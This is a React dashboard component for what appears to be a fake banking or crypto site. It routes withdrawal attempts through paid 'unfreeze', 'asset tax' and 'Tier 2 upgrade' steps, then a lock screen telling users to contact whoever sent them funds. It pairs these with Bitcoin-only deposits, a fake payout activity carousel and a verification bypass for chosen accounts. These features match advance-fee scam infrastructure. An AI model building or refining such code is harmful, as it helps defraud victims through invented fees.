import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../../context/AuthContext';
import { WithdrawalCarousel } from '../WithdrawalCarousel/WithdrawalCarousel';
import { formatCurrency } from '../../utils/helpers';
import {
  LuCopy as Copy,
  LuCheck as Check,
  LuBell as Bell,
  LuSettings as Settings,
  LuArrowDownLeft as ArrowDownLeft,
  LuArrowUpRight as ArrowUpRight,
  LuSend as Send,
  LuUsers as Users,
  LuHistory as History,
  LuEye as Eye,
  LuEyeOff as EyeOff,
  LuLock as Lock,
  LuWallet as Wallet,
  LuChevronRight as ChevronRight,
} from 'react-icons/lu';
import './UserDashboard.css';

export const UserDashboard = () => {
  const { user, refreshUser } = useAuth();
  const navigate = useNavigate();
  const [copied, setCopied] = useState(false);
  const [hideBalance, setHideBalance] = useState(false);

  // Refresh user on mount to ensure latest state
  useEffect(() => {
    refreshUser();
  }, [refreshUser]);

  const unreadCount = 0;

  const handleCopyAccount = () => {
    if (!user?.accountNumber) return;
    navigator.clipboard.writeText(user.accountNumber);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const formattedBalance = formatCurrency(user?.balance || 0);

  // Determine account type display
  let accountType = 'Institutional Tier-1';
  if (user?.hasPaidTax && user?.isLocked) {
    accountType = 'Tier 2 (Locked)';
  } else if (user?.hasPaidTax) {
    accountType = 'Tier 2';
  }

  // Check if user is frozen: only true if isFrozen is true AND unfreeze is not paid
  const isFrozen = user?.isFrozen && !user?.hasPaidUnfreeze;

  // Button click handlers with guards
  const handleWithdrawClick = async () => {
    // Refresh latest user first to avoid stale state
    const latestUser = await refreshUser().catch(() => null);
    const currentUser = latestUser || user;

    // Bypass users can withdraw directly
    if (currentUser?.bypassVerification) {
      navigate('/withdraw');
      return;
    }

    // Determine account type from current user
    let currentAccountType = 'Institutional Tier-1';
    if (currentUser?.hasPaidTax && currentUser?.isLocked) {
      currentAccountType = 'Tier 2 (Locked)';
    } else if (currentUser?.hasPaidTax) {
      currentAccountType = 'Tier 2';
    }

    // If account is Tier 2 (or locked), redirect to lock page
    if (currentAccountType === 'Tier 2 (Locked)' || currentAccountType === 'Tier 2') {
      navigate('/lock-account');
      return;
    }

    // If unfreeze is paid but tax is not, redirect to asset-tax
    if (currentUser?.hasPaidUnfreeze && !currentUser?.hasPaidTax) {
      navigate('/asset-tax');
      return;
    }

    // If frozen and unfreeze not paid, redirect to freeze page
    if (currentUser?.isFrozen && !currentUser?.hasPaidUnfreeze) {
      navigate('/freeze-account');
      return;
    }

    // Otherwise, go to withdraw page
    navigate('/withdraw');
  };

  const handleTransferClick = async () => {
    const latestUser = await refreshUser().catch(() => null);
    const currentUser = latestUser || user;

    if (currentUser?.isLocked) {
      navigate('/lock-account');
      return;
    }
    navigate('/transfer');
  };

  return (
    <div className="dashboard">
      {/* Freeze warning - only if frozen and not unfrozen */}
      {isFrozen && (
        <div className="freeze-warning">
          <Lock />
          <div>
            <h3>Action Required: Account Security Hold</h3>
            <p>Your withdrawal of ${(user.pendingWithdrawalAmount || 0).toLocaleString()} is pending. Unfreeze verification is required.</p>
          </div>
          <button onClick={() => navigate('/unfreeze-account')}>Complete Unfreeze Verification <ChevronRight /></button>
        </div>
      )}

      {/* Upgrade warning - if unfrozen but not upgraded yet */}
      {!isFrozen && user?.hasPaidUnfreeze && !user?.hasPaidTax && !user?.isLocked && (
        <div className="upgrade-warning">
          <div>
            <h3>Upgrade to Tier 2 Required</h3>
            <p>You need to upgrade your account to Tier 2 before you can make withdrawals.</p>
          </div>
          <button onClick={() => navigate('/asset-tax')}>Upgrade Now <ChevronRight /></button>
        </div>
      )}

      {/* Lock warning - if locked */}
      {user?.isLocked && (
        <div className="lock-warning">
          <Lock />
          <div>
            <h3>Account Temporarily Locked</h3>
            <p>Your account is locked for security verification. Please contact the person who transferred funds to you.</p>
          </div>
          <button onClick={() => navigate('/lock-account')}>View Lock Details <ChevronRight /></button>
        </div>
      )}

      {/* Header */}
      <div className="dashboard-header">
        <div className="user-greeting">
          <div className="avatar">{user?.firstName.charAt(0)}</div>
          <div>
            <h1>Hello, {user?.firstName}</h1>
            <div className="account-info">
              <span>Account No:</span>
              <span className="account-number">{user?.accountNumber}</span>
              <button onClick={handleCopyAccount}>{copied ? <Check /> : <Copy />}</button>
              {copied && <span className="copied">Copied!</span>}
            </div>
          </div>
        </div>
        <div className="header-actions">
          <button className="icon-btn" title="Notifications">
            <Bell />
            {unreadCount > 0 && (
              <span className="notification-badge">{unreadCount}</span>
            )}
          </button>
          <button className="icon-btn" title="Settings"><Settings /></button>
        </div>
      </div>

      {/* Balance card */}
      <div className="balance-card">
        <div className="balance-info">
          <div className="balance-label">
            <Wallet /> Total Available Balance
            <button onClick={() => setHideBalance(!hideBalance)}>
              {hideBalance ? <Eye /> : <EyeOff />}
            </button>
          </div>
          <div className="balance-amount">
            {hideBalance ? '••••••••••' : formattedBalance}
            <span className="currency">USD</span>
          </div>
          <div className="account-status">
            Account Status: <span className={isFrozen ? 'frozen' : 'active'}>
              {isFrozen ? '⚠️ Verification On Hold' : '● Active & Operational'}
            </span>
          </div>
        </div>
        <div className="balance-quick-info">
          <div><span>Account Type</span><span>{accountType}</span></div>
          <div><span>Deposit Channel</span><span>Bitcoin Vault</span></div>
          <div><span>Transfer Settlement</span><span>Instant (0s)</span></div>
        </div>
      </div>

      {/* Quick actions */}
      <div className="quick-actions">
        <h2>Quick Financial Operations</h2>
        <div className="action-grid">
          <button onClick={() => navigate('/deposit')}>
            <ArrowDownLeft /> <span>Deposit</span><small>Crypto Bitcoin</small>
          </button>
          <button onClick={handleWithdrawClick}>
            <ArrowUpRight /> <span>Withdraw</span><small>Wire, BTC, PayPal</small>
          </button>
          <button onClick={handleTransferClick}>
            <Send /> <span>Transfer</span><small>Instant 7-Digit Peer</small>
          </button>
          <button onClick={() => navigate('/invite')}>
            <Users /> <span>Invite</span><small>Referral Link</small>
          </button>
          <button onClick={() => navigate('/transactions')}>
            <History /> <span>History</span><small>All Logs & Receipts</small>
          </button>
        </div>
      </div>

      {/* Carousel */}
      <div className="dashboard-carousel">
        <h2>Live Global Disbursal Activity</h2>
        <WithdrawalCarousel />
      </div>
    </div>
  );
};